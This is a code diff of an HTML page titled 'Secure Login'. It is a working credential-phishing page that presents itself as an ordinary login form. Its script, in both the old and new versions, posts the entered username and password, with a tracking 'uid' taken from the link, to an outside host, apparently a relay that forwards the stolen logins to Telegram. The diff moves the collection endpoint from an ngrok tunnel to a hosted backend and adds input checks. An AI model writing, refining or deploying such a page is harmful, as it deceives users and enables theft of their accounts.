@@ -1,52 +1,91 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Login</title>
-<style>
-body {background: linear-gradient(120deg,#0f2027,#203a43,#2c5364); color:white;
-display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;}
-.box {background: rgba(255,255,255,0.1); padding:30px; border-radius:12px; box-shadow:0 0 10px rgba(0,0,0,0.5); width:300px;}
-input, button {width:100%; padding:10px; margin:10px 0; border:none; border-radius:8px;}
-input {background:#fff; color:#333;}
-button {background:#00c6ff; color:white; cursor:pointer;}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Login</title>
+  <style>
+    body {
+      background: linear-gradient(120deg, #0f2027, #203a43, #2c5364);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+    .box {
+      background: rgba(255,255,255,0.1);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      width: 300px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    input {
+      background: #fff;
+      color: #333;
+    }
+    button {
+      background: #00c6ff;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-<div class="box">
-<h2>Login</h2>
-<input type="text" id="username" placeholder="Username">
-<input type="password" id="password" placeholder="Password">
-<button onclick="sendLogin()">Login</button>
-</div>
+  <div class="box">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="sendLogin()">Login</button>
+  </div>
 
-<script>
-const NGROK_URL = "https://unburst-unfeatured-jericho.ngrok-free.dev"; // e.g. https://abcd-1234-5678.ngrok.io
+  <script>
+    const BACKEND_URL = "https://bot-production-85f6.up.railway.app";
 
-function getUID() {
-    const params = new URLSearchParams(window.location.search);
-    return params.get("uid");
-}
+    function getUID() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get("uid");
+    }
 
-function sendLogin() {
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    const uid = getUID();
-    if (!uid) { alert("Invalid link."); return; }
+    async function sendLogin() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const uid = getUID();
 
-    fetch(`${NGROK_URL}/receive_login`, {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body: JSON.stringify({uid, username, password})
-    })
-    .then(res => res.json())
-    .then(data => {
-        if(data.status==="sent") alert("Login info sent to Telegram!");
-        else alert("Error sending info.");
-    })
-    .catch(err=>alert("Network error: "+err));
-}
-</script>
+      if (!uid) {
+        alert("Invalid link: UID not found.");
+        return;
+      }
+      if (!username || !password) {
+        alert("Enter both username and password.");
+        return;
+      }
+
+      try {
+        const res = await fetch(`${BACKEND_URL}/receive_login`, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ uid, username, password })
+        });
+        const data = await res.json();
+        if (data.status === "sent") {
+          alert("✅ Login info sent to Telegram!");
+        } else {
+          alert("❌ Error: " + (data.error || "Unknown error"));
+        }
+      } catch (err) {
+        alert("❌ Network error: " + err);
+      }
+    }
+  </script>
 </body>
 </html>
